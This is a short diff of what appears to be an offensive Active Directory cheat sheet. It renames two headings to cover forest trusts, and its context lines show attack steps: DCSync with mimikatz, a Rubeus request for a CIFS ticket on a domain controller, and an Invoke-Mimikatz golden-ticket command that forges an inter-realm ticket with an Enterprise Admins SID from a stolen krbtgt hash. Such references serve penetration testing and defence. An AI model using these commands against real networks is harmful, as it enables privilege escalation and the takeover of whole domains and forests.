@@ -355,7 +355,7 @@ or
 ```
 -> then we can dcsync with mimikatz because we got ldap tgs as domain admin
 
-# Pivoting/escalate domain with domain trust key
+# Pivoting/escalate domain/forest trust with domain trust key
 
 ask tgt as enterprise admin with the domain trust key:
 ```
@@ -367,7 +367,7 @@ Rubeus.exe asktgs /ticket:<ticket-created-before> /service:cifs/<FQDN-DomainCont
 ```
 -> then exploit the cifs tgs as enterprise admin :)
 
-# Pivoting/escalate domain with krbtgt hash
+# Pivoting/escalate domain/forest with krbtgt hash
 create inter-realm tgt:
 ```
 Invoke-Mimikatz -Command '"kerberos::golden /user:<anyuser> /domain:<current-domain> /sid:<sid-current-domain> /sids:<sid-target-domain>-519 /krbtgt:<hash>"'
